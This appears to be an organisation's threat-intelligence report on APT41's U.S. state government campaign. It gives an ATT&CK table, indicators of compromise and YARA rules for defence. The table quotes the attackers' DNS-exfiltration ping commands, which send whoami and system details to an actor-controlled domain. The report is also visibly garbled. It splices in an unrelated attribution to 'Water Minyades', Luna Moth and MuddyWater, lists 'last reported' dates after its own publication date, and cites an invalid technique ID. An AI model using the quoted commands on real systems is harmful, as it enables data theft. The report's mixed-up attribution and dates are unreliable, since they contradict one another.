@@ -1,0 +1,574 @@
+--- Page 1 ---
+Date of Report  :
+March 8, 2023SECTOR TARGETING: 
+APT41 Leverages 0-day 
+Vulnerability and New Malware 
+Variants in Successful 
+U.S.-Focused Intrusion 
+Campaign
+APT41, a China-based threat group known to target our sector, recently leveraged new malware and 
+a 0-day vulnerability to successfully compromise six U.S. state government networks. The 0-day 
+poses no risk to our systems as the software is not in our technology stack. However, the new mal-
+ware leveraged in this intrusion operates in memory and has the potential to evade existing signa-
+tures. Additionally, APT41 used new defense evasion, C2, persistence, and exfiltration techniques 
+that may be used in future APT41 operations or by other Chinese nation-state cyber actors.
+KEY POINTSCampaign 
+Report
+EXECUTIVE SUMMARY
+Campaign Report Page 1• APT41 is leveraging vulnerabilities in web-facing applications as their initial intrusion vector. In 
+the most recent campaign, they leveraged CVE-2021-44228 and CVE-2021-44207.
+• APT41 updated its malware toolset, including enhanced capabilities for DEADEYE, which ex-
+ecutes new guardrail capabilities to ensure the malware only executes on intended victim ma-
+chines; deployment of DUSTPAN, a new in-memory dropper leveraged to deploy Cobalt Strike; 
+and the KEYPLUG backdoor for execution in Linux serversWater Minyades is the threat actor 
+likely responsible for the intrusion due to the use of a watering hole as an initial intrusion vector; 
+however, Luna Moth and MuddyWater also are associated with the tool. If our attribution assess-
+ment proved incorrect, data theft and/or extortion is likely.
+• APT41 continued to rely on Cloudflare services for C2 communications and data exfiltration, 
+including the novel use of Ping commands to write collected data from a victim network to an 
+actor-controlled DNS activity log. 
+03/08/2023CAM-2023-0004 Criticality: Low TLP CLEAR
+
+
+--- Page 2 ---
+A China-based threat group, APT41, has updated its TTPs to include a new capability against Linux 
+devices and increased evasion capabilities for one of its primary backdoors. During this campaign 
+they have modified their initial intrusion vector from social engineering to exploiting vulnerabilities 
+in web applications. We assess with high confidence that this change reflects more targeted opera-
+tions and is driven by recent high value vulnerabilities. It is highly likely that APT41 will return to its 
+standard means of initial access, in the long run. However, their ability to rapidly pivot to this initial 
+intrusion vector means vulnerability management is a key network defense capability in combating 
+this group’s intrusions. 
+• APT41 exploited vulnerable Internet-facing web applications for initial access, including a ze-
+ro-day vulnerability in the USAHerds application, publicly disclosed vulnerabilities in the com-
+monly used logging framework Log4J, .NET deserialization vulnerabilities, and SQL injection 
+attacks. 
+• APT41 previously exploit ed vulnerabilities in Citrix, Cisco, and Zoho appliances to gain initial access to 
+networks of interest. 
+We assess with high confidence that APT41 will continue to evolve its tradecraft in pursuit of achieving their 
+espionage goals. During this campaign, APT41 used new defense evasion, C2, persistence, and exfiltration 
+techniques that may be used in future APT41 operations or by other Chinese nation-state cyber actors. 
+• Defense Evasion: In addition to using VMProtect to pack their DEADEYE launcher and LOWKEY backdoo r 
+malware, APT41 chunked the packaged binaries into multiple sections on disk, likely to reduce the chance 
+that all samples can be successfully acquired during a forensic investigation. The actors also changed the 
+standard VMProtect section names from .vmp to .upx, likely to inhibit hunting detections.
+• C2: In at least one case, APT41 used a new in-memory dropper called DUSTPAN to load a Cobalt Strike 
+BEACON backdoor. 
+• C2: Throughout the campaign, APT41 used Cloudflare Workers services for C2 communications and data 
+exfiltration. For their KEYPLUG backdoor, APT41 used dead drop resolvers within two separate tech com -
+munity forums, which provided true C2 addresses from encoded data managed by the actors. Mandiant 
+assessed this unique tradecraft helps keep APT41’s C2 infrastructure hidden.
+• Persistence: APT41 launched malware through the addition of a malicious import to the Import Address 
+Table of legitimate Windows PE binaries and used several Windows scheduled tasks for persistence (see 
+the ATT&CK table for specific tasks).
+• Exfiltration: For exfiltration, APT41 used a unique combination of Ping commands where the output of re -
+connaissance commands—such as whoami, userdomain, and findstr Number—were prepended to subdo -
+mains of Cloudflare proxied infrastructure. While the Cloudflare name servers were unable to resolve an 
+IP address for the fabricated domains, the actors were able to collect the reconnaissance command output ASSESSMENT
+Campaign Report Page 2 03/08/2023CAM-2023-0004 Criticality: Low TLP CLEAR
+
+--- Page 3 ---
+ATTRIBUTION TACTICS TECHNIQUES SUBTECHNIQUE PROCEDURE D3FEND DEPLOYED 
+CONTROL
+APT41 Initial Access T1190/Exploit Pub -
+lic-Facing ApplicationN/A APT41 exploited CVE-2021-44228 in 
+Log4j, CVE-2021-44207 in the USA 
+Herds application, and through SQL 
+injection.LINK Web Application 
+Firewall 
+APT41 Execution T1059/Command and 
+Scripting InterpreterT1059.003/Com -
+mand and Script -
+ing Interpreter: 
+Windows Command 
+ShellDEADEYE has run cmd /c copy /y 
+/b C:\Users\public\syslog_6-*.dat C:\
+Users\public\syslog.dll to combine sep -
+arated sections of code into a single 
+DLL prior to execution.LINK Application 
+Control
+APT41 Execution T1106/Native API N/A DEADEYE can execute the GetCom -
+puterNameA and GetComputerName -
+ExA WinAPI functions.LINK Application 
+Control
+APT41 Persistence T1574/Hijack Execu -
+tion FlowN/A APT41 established persistence by 
+loading malicious libraries via modifica -
+tions to the Import Address Table (IAT) 
+within legitimate Microsoft binaries.LINK Application 
+Control
+APT41 Persistence T1053/Scheduled 
+Task/JobT1053:005/Sched -
+uled Task/Job: 
+Scheduled TaskAPT41 used the \Microsoft\Windows\
+PLA\Server Manager Performance 
+Monitor, \Microsoft\Windows\Ras\Man-
+agerMobility, \Microsoft\Windows\WDI\
+SrvSetupResults, and \Microsoft\Win -
+dows\WDI\USOShare scheduled tasks 
+for DEADEYE dropper persistence.LINK N/A
+APT41 Defense 
+EvasionT1480/Execution 
+GuardrailsN/A DEADEYE malware ensured it only 
+executed on an intended system by 
+identifying the victim’s volume serial 
+number, hostname, and DNS domain.N/A N/A• No information was provided regarding how APT41 identified specific victims or conducted other 
+Reconnaissance techniques leading up to this campaign.
+• Motivation for these intrusions and thus their end goal is still unknown. While this campaign’s 
+victimology is consistent with an espionage operation, it is possible some elements were con-
+ducted for personal financial gain given APT41 actors’ previous history of moonlighting as cy-
+ber-crime operators.
+• We do not know the full extent of the campaign given the reporting’s limited focus on US state 
+government network; it is possible our organization or others in our sector were targeted based 
+on APT41’s previous operations.
+MITRE ATT&CK TABLE (BASED ON V12)KEY INTELLIGENCE GAPSCAM-2023-0004 Criticality: Low TLP CLEAR
+Campaign Report Page 3 03/082023
+
+--- Page 4 ---
+ATTRIBU-
+TIONTACTICS TECHNIQUE SUBTECH-
+NIQUEPROCEDURE D3FEND DEPLOYED 
+CONTROL
+APT41 Defense 
+EvasionT1036/Masquerading T1036.005/Mas -
+querading: Match 
+Legitimate Name 
+or LocationAPT41 used file names beginning with 
+USERS, SYSUSER, and SYSLOG to hide 
+DEADEYE malware, and changed KEY -
+PLUG file extensions from .vmp to .upx to 
+avoid hunting detections.LINK Antivirus
+APT41 Credential 
+AccessT1003/OS Credential 
+DumpingT1003.002/
+OS Credential 
+Dumping: Security 
+Account ManagerAPT41 copied the SAM and SYSTEM Reg -
+istry hives for credential harvesting.LINK
+APT41 Discovery T1082/System Informa-
+tion DiscoveryN/A APT41 used ping -n 1 ((cmd /c dir c:\|find-
+str Number).split()[-1]+ commands to find 
+the volume serial number of compromised 
+systems.LINK N/A
+APT41 Discovery T1016/System Network 
+Configuration Discov -
+eryN/A APT41 used the cmd.exe /c ping %userdo -
+main% command as part of their discovery 
+activity.LINK N/A
+APT41 Collection T1005/Data From 
+Local SystemN/A APT41 collected information related to the 
+compromised network as well as sensitive 
+information, including PII.LINK Data Loss 
+Prevention 
+APT41 Command 
+and ControlT1102.001/Web 
+ServiceT1102.001/Web 
+Service: Dead 
+Drop ResolverAPT41 used dead drop resolvers on two separate 
+tech community forums so KEYPLUG malware 
+would fetch its true C2 address from encoded 
+data on a specific forum post; the group updated 
+the community forum posts frequently withLINK Network 
+Intrusion 
+Prevention
+APT41 Command 
+and ControlT1102/Web Service APT41 used Cloudflare as part of their C2 
+infrastructure.https://d3fend.
+mitre.org/offen -
+sive-technique/
+attack/T1102/Network 
+Intrusion 
+Prevention
+APT41 Exfiltration T1048/Exfiltration Over 
+Alternative ProtocolT1048.003/
+Exfiltration Over 
+Alternative Pro -
+tocol: Exfiltration 
+Over Unencrypted 
+Non-C2 ProtocolAPT41 issued the following Ping commands 
+where the output of a reconnaissance 
+command was prepended to subdomains 
+of Cloudflare proxied infrastructure, which 
+allowed the actors to collect the command 
+output from DNS activity logs: $a=whoam -
+i;ping ([System.BitConverter]::To-
+String([System.Text.Encoding]::UTF8.Get-
+Bytes($a)).replace('-','')+""[.]ns[.]time12[.]
+cf""),cmd.exe /c ping %userdomain%[.]ns[.]
+time12[.]cf, ping -n 1 ((cmd /c dir c:\|findstr 
+Number).split()[-1]+'.ns[.]time12[.]cf, and 
+ping -n 1 ((ls C:\Users\public\syslog_6-1.
+dat).Length.ToString()+"".ns[.]time12[.]cf"").  LINK Data BackupCAM-2023-0004 Criticality: Low TLP CLEAR
+Campaign Report Page 4 03/08/2023
+
+--- Page 5 ---
+ATTRIBU-
+TIONTACTICS TECHNIQUE SUBTECH-
+NIQUEPROCEDURE D3FEND DEPLOYED 
+CONTROL
+APT41 Exfiltration T2567/Exfiltration Over 
+Web ServiceN/A APT41 used Cloudflare services for data 
+exfiltration.N/A
+INDIA
+INDONESIA
+MALAYSIA
+PHILIPPINES
+TAIWAN
+VIETNAM
+USA
+OCTOBER 
+2020DECEMBER
+2020FEBRUARY 
+2021APRIL
+2021MAY
+2021JUNE
+2021AUGUST
+2021OCTOBER
+2021DECEMBER
+2021FEBRUARY
+2022TIMELINE OF ACTIVITY
+ATTRIBU-
+TIONMALICIOUS 
+TOOL NAMEHASH 
+TYPEFILE HASH ASSOCIATED 
+FILE HASHBRIEF 
+DESCRIPTIONMALWARE 
+ANALYSIS 
+REPORT 
+(HYPERLINK, 
+OR N/A)FIRST 
+REPORTEDLAST 
+REPORTED
+APT41 KEYPLUG.
+LINUXMD5 900ca3ee85dfc -
+109baeed4888c -
+cb5d39N/A Backdoor malware LINK FEB 2, 2023 April 14 2023
+APT41 KEYPLUG.
+LINUXMD5 b82456963d -
+04f44e83442b -
+6393face47N/A Backdoor malware LINK Feb 8 2022 April 16 2023
+APT41 DSQUERYMD5 49f1daea8a115dd6f -
+ce51a1328d863cfN/A Command utility, used 
+for network 
+enumeration LINK Nov 20 2010 March 6 2023INDICATORS OF COMPROMISE
+MALWARECAM-2023-0004 Criticality: Low TLP CLEAR
+Campaign Report Page 5 03/08/2023
+
+--- Page 6 ---
+ATTRIBU-
+TIONMALICIOUS 
+TOOL NAMEHASH 
+TYPEFILE HASH ASSOCIATED 
+FILE HASHBRIEF 
+DESCRIPTIONMALWARE 
+ANALYSIS 
+REPORT 
+(HYPERLINK, 
+OR N/A)FIRST 
+REPORTEDLAST 
+REPORTED
+APT41 DSQUERY MD5 b108b28138
+b93ec4822e1
+65b82e41c7aN/A Command utility, 
+used for network 
+enumerationLINK July 14 2009 March 19 
+2023
+APT41 BADPOTA-
+TOMD5 143278845a3
+f5276a1dd58
+60e7488313N/A Open-source 
+malware, used for 
+privilege escalation N/A May 2021 February 2022
+APT41 DUSTPAN/
+StealthVec-
+torSHA256 59fa89a19aa236ae
+c216f0c8e8d5929
+2b8d4e1b3c8b5f9
+4038851c 
+c5396d6513LNK downloader for 
+the Dustpan Memory 
+DropperLINK January 9 
+2020November 23 
+2020
+Attribution Network Artifact Details Intrusion Phase FIRST 
+REPORTEDLAST 
+REPORTED
+APT41 194[.]195[.]125[.]121 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. 
+State  Government Cam-
+paign – USAHerds (CVE-
+2021-44207) ExploitationMay 2021 February 2022
+APT41 194[.]156[.]98[.]12  Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. 
+State  Government Cam-
+paign – USAHerds (CVE-
+2021-44207) ExploitationMay 2021 February 2022
+APT41 54[.]248[.]110[.]45 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 45[.]153[.]231[.]31 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 185[.]118[.]167[.]40 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 104[.]18[.]6[.]251 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022NETWORKCAM-2023-0004 Criticality: Low TLP CLEAR
+Campaign Report Page 6 03/08/2023
+
+--- Page 7 ---
+Attribution Network Artifact Details Intrusion Phase First Reported Last Reported 
+APT41 104[.]18[.]7[.]251 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 20[.]121[.]42[.]11 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 34[.]139[.]13[.]46 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 54[.]80[.]67[.]241 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 149[.]28[.]15[.]152 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 18[.]118[.]56[.]237 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 107[.]172[.]210[.]69 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 172[.]104[.]206[.]48 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 67[.]205[.]132[.]162 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 45[.]84[.]1[.]181 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 cdn[.]ns[.]time12[.]cf Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022CAM-2023-0004 Criticality: Low TLP CLEAR
+Campaign Report Page 7 03/08/2023
+
+--- Page 8 ---
+Attribution Network Artifact Details Intrusion Phase First Reported Last Reported 
+APT41 east[.]winsproxy[.]com Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 afdentry[.]workstation[.]eu[.]org Related to initial exploitation 
+leveraging 0-day vulnerabilityData Exfiltration - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 ns1[.]entrydns[.]eu[.]org Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 subnet[.]milli-seconds[.]com Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 work[.]viewdns[.]ml Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 work[.]queryip[.]cf Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - U.S. State  
+Government Campaign – 
+USAHerds (CVE-2021-44207) 
+ExploitationMay 2021 February 2022
+APT41 103[.]238[.]225[.]37 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - Log4j (CVE-
+2021-44228) Exploitation May 2021 February 2022
+APT41 182[.]239[.]92[.]31 Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - Log4j (CVE-
+2021-44228) Exploitation May 2021 February 2022
+APT41 microsoftfile[.]com Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - Log4j (CVE-
+2021-44228) Exploitation May 2021 February 2022
+APT41 down-flash[.]com Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - Log4j (CVE-
+2021-44228) Exploitation May 2021 February 2022
+APT41 libxqagv[.]ns[.]dns3[.]cf Related to initial exploitation 
+leveraging 0-day vulnerabilityInitial Intrusion - Log4j (CVE-
+2021-44228) Exploitation May 2021 February 2022CAM-2023-0004 Criticality: Low TLP CLEAR
+Campaign Report Page 8 03/08/2023
+
+--- Page 9 ---
+Attribution CVE Number CVSS Score Patch Available (Y/N) Other Remediation Date Reported Patch Applied 
+(Y/N/UNK/NA)
+APT41 CVE-2021-44228 10.0 Y N/A Dec 10 2021 Y
+APT41CVE-2021-44207 8.1 Y Vulnerability Management 
+is checking if other software 
+from Acclaim is in our 
+network. Dec 21 2021  N/A
+APT41CVE-2019-19781 9.8 Y N/A Dec 17 2019 NCOMMON VULNERABILITIES AND EXPOSURES (CVEs)
+SIGNATURES
+1. KEYPLUG 
+rule M_APT_Backdoor_KEYPLUG_MultiXOR_Config
+{
+    meta:
+        author = “Mandiant”
+        description = “Matches KEYPLUG XOR-encoded configurations. Locates 
+multiple values of: TCP://, UDP://, WSS://, +http and their pipe-deliminated vari-
+ant: |TCP://, |UDP://, |WSS://, |+http. Requires at least one instance of 00| in the 
+encoded configuration which corresponds to the sleep value. Removed instances 
+where double-NULLs were present in the generated strings to reduce false posi-
+tives.”
+    strings:
+        // TCP
+        $tcp1   = “TCP://”  xor(0x01-0x2E)
+        $tcp2   = “TCP://”  xor(0x30-0xFF)
+        $ptcp1  = “|TCP://” xor(0x01-0x2E)
+        $ptcp2  = “|TCP://” xor(0x30-0xFF)
+        // UDP
+        $udp1   = “UDP://”  xor(0x01-0x2E)
+        $udp2   = “UDP://”  xor(0x30-0xFF)
+        $pudp1  = “|UDP://” xor(0x01-0x2E)
+        $pudp2  = “|UDP://” xor(0x30-0xFF)
+        // WSS
+        $wss1   = “WSS://”  xor(0x01-0x2E)
+        $wss2   = “WSS://”  xor(0x30-0x52)
+        $wss3   = “WSS://”  xor(0x54-0xFF)CAM-2023-0004 Criticality: Low TLP CLEAR
+Campaign Report Page 9 03/08/2023
+
+--- Page 10 ---
+        $pwss2  = “|WSS://” xor(0x30-0x52)
+        $pwss3  = “|WSS://” xor(0x54-0xFF)
+        // HTTP
+        $http1  = “+http”   xor(0x01-0x73)
+        $http2  = “+http”   xor(0x75-0xFF)
+        $phttp1 = “|+http”  xor(0x01-0x73)
+        $phttp2 = “|+http”  xor(0x75-0xFF)
+        // Sleep value
+        $zeros1 = “00|”     xor(0x01-0x2F)
+        $zeros2 = “00|”     xor(0x31-0xFF)
+    condition:
+        filesize < 10MB and
+        (uint32(0) == 0x464c457f or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) 
+== 0x00004550)) and 
+        for any of ($tcp*,$udp*,$wss*,$http*): (# == 2 and @[2] - @[1] < 200) and
+        for any of ($ptcp*,$pudp*,$pwss*,$phttp*): (# == 1) and
+        any of ($zeros*)
+}
+2. BADPOTATO
+rule M_Hunting_MSIL_BADPOTATO
+{
+    meta:
+        author = “Mandiant”
+        description = “Hunting for BADPOTATO samples based on default strings 
+found on the PE VERSIONINFO resource.”
+    strings:
+        $dotnetdll = “\x00_CorDllMain\x00”
+        $dotnetexe = “\x00_CorExeMain\x00”
+        $s1 = { 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 
+74 00 69 00 6F 00 6E 00 00 00 00 00 42 00 61 00 64 00 50 00 6F 00 74 00 61 00 
+74 00 6F 00 }
+        $s2 = { 49 00 6E 00 74 00 65 00 72 00 6E 00 61 00 6C 00 4E 00 61 00 6D 00 
+65 00 00 00 42 00 61 00 64 00 50 00 6F 00 74 00 61 00 74 00 6F 00 2E 00 65 00 
+78 00 65 00 }
+        $s3 = { 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 
+65 00 6E 00 61 00 6D 00 65 00 00 00 42 00 61 00 64 00 50 00 6F 00 74 00 61 00 
+74 00 6F 00 2E 00 65 00 78 00 65 00 }
+        $s4 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 
+00 00 00 00 42 00 61 00 64 00 50 00 6F 00 74 00 61 00 74 00 6F 00 }
+    condition:
+        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and 1 of 
+($dotnet*) and 1 of ($s*)
+}CAM-2023-0004 Criticality: Low TLP CLEAR
+Campaign Report Page 10 03/08/2023
+
+--- Page 11 ---
+ALMOST NO 
+CHANCEVERY 
+UNLIKELYUNLIKELY ROUGHLY 
+EVEN CHANCELIKELY VERY LIKELY ALMOST 
+CERTAINLY
+remote highly 
+improbableimprobable 
+(improbably)roughly even 
+oddsprobable 
+(probably)highly probable nearly certain
+01-05% 05-20% 20-45% 45-55% 55-80% 80-95% 95-99%PROBABILITY MATRIX
+INTELLIGENCE REQUIREMENTS
+• Identify and research activity targeting critical assets
+• Identify and research actors targeting similar organizations
+FEEDBACK
+Please take a moment to provide feedback on this report by emailing EXAMPLE@companydomain.
+com; all comments are reviewed and used to enhance future reporting.
+1. Rate the product’s overall value:  
+a. Very valuable 
+b. Somewhat valuable 
+c. Of limited value 
+d. Not valuable 
+2. Rate the product’s utility:  
+a. Highly actionable 
+b. Actionable 
+c. Not actionable. 
+3. Rate the product’s quality of analysis: 
+a. High quality analysis 
+b. Acceptable quality analysis 
+c. Low quality analysis 
+4. Rate the product’s timeliness: 
+a. Very timely 
+b. Timely 
+c. Not timely. 
+5. What did you find particularly useful or lacking in the report?CAM-2023-0004 Criticality: Low TLP CLEAR
+Campaign Report Page 11 03/08/2023
+
+--- Page 12 ---
+https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/earth-ba-
+ku-returns
+https://www.mandiant.com/resources/blog/apt41-us-state-governmentsDATA SOURCES
+Threat Actor:  APT41
+    Earth Baku, Barium, Bronze Atlas, Double Dragon, Wicked Panda, 
+    Group G0096
+Victim Location:  USA, India, Indonesia, Malaysia, Philippines, Taiwan, Vietnam
+Sectors:   USG, airline, computer hardware, automotive, infrastructure, 
+    publishing media, IT industries
+Infrastructure Used: NA
+Actor Motivation:  Cyber Espionage, Cyber CrimeCAM-2023-0004 Criticality: Low TLP CLEAR
+Campaign Report Page 12 03/08/2023
+
+--- Page 13 ---
+CAM-2023-0004 Criticality: Low TLP CLEAR
+Campaign Report Page 13 03/08/2023
